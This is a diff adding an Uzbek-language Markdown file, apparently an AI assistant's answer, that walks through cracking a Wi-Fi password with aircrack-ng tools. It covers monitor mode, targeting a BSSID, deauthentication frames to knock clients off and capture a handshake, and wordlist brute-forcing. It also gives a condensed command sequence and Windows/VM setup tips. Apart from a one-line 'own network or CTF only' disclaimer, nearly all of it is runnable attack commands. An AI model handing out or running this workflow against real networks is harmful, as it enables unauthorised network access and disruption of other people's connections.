@@ -1,0 +1,148 @@
+Bu tool’lar (**Wi-Fi auditing uchun**) juda kuchli — lekin eslatib o‘taman: ularni faqat **o‘zingga tegishli tarmoq yoki CTF/lab muhitida** ishlatish kerak.
+
+Quyida sen so‘raganidek **Ubuntu (Kali/Linux)** va **Windows** uchun **asosiy komandalar ketma-ketligi**ni ko‘rsataman 👇
+
+---
+
+# 🐧 Ubuntu / Kali Linux (eng to‘g‘ri muhit)
+
+## 🔹 1. Monitor mode yoqish
+
+**Tool:** airmon-ng
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+```
+
+📌 Natija:
+
+* `wlan0` → `wlan0mon` ga o‘zgaradi
+
+---
+
+## 🔹 2. Tarmoqlarni ko‘rish (scan)
+
+**Tool:** airodump-ng
+
+```bash
+sudo airodump-ng wlan0mon
+```
+
+📌 Bu yerda:
+
+* BSSID
+* Channel
+* SSID ko‘rinadi
+
+---
+
+## 🔹 3. Targetga fokuslanish (capture)
+
+```bash
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+```
+
+📌 Izoh:
+
+* `-c` → kanal
+* `--bssid` → target MAC
+* `-w` → fayl nomi
+
+---
+
+## 🔹 4. Handshake olish (deauth)
+
+**Tool:** aireplay-ng
+
+```bash
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+📌 Bu clientni uzib, handshake olishga yordam beradi
+
+---
+
+## 🔹 5. Parolni bruteforce qilish
+
+**Tool:** aircrack-ng
+
+```bash
+aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap
+```
+
+📌:
+
+* `-w` → wordlist
+* `-b` → target BSSID
+
+---
+
+# 🪟 Windows (cheklangan)
+
+Windows’da bu tool’lar to‘g‘ridan-to‘g‘ri ishlamaydi ❗
+Lekin variantlar bor:
+
+---
+
+## 🔹 Variant 1: WSL (tavsiya etiladi emas)
+
+* Ko‘pincha **monitor mode ishlamaydi**
+
+---
+
+## 🔹 Variant 2: Kali Linux Virtual Machine
+
+👉 Eng yaxshi yo‘l:
+
+* VirtualBox yoki VMware
+* Kali Linux o‘rnatish
+* USB Wi-Fi adapter passthrough qilish
+
+---
+
+## 🔹 Variant 3: Windows port (cheklangan)
+
+**Tool:**
+
+* Aircrack-ng for Windows
+
+Misol:
+
+```bash
+aircrack-ng.exe -w wordlist.txt capture.cap
+```
+
+📌 Lekin:
+
+* ❌ airodump-ng to‘liq ishlamaydi
+* ❌ aireplay-ng deyarli ishlamaydi
+
+---
+
+# ⚡ ENG TO‘G‘RI SETUP
+
+👉 Agar CTF qilayotgan bo‘lsang:
+
+✅ Kali Linux (native yoki VM)
+✅ USB Wi-Fi adapter (monitor mode support)
+
+---
+
+# 🔥 Qisqa flow (eslab qolish uchun)
+
+```bash
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c [kanal] --bssid [MAC] -w file wlan0mon
+aireplay-ng --deauth 10 -a [MAC] wlan0mon
+aircrack-ng -w wordlist.txt file.cap
+```
+
+---
+
+Agar xohlasang, keyingi bosqichda men senga:
+👉 **eng arzon va ishlaydigan Wi-Fi adapterlar (monitor mode bilan)**
+👉 yoki **TryHackMe’da Wi-Fi hacking lab setup**
+
+ham aniq qilib beraman 👍
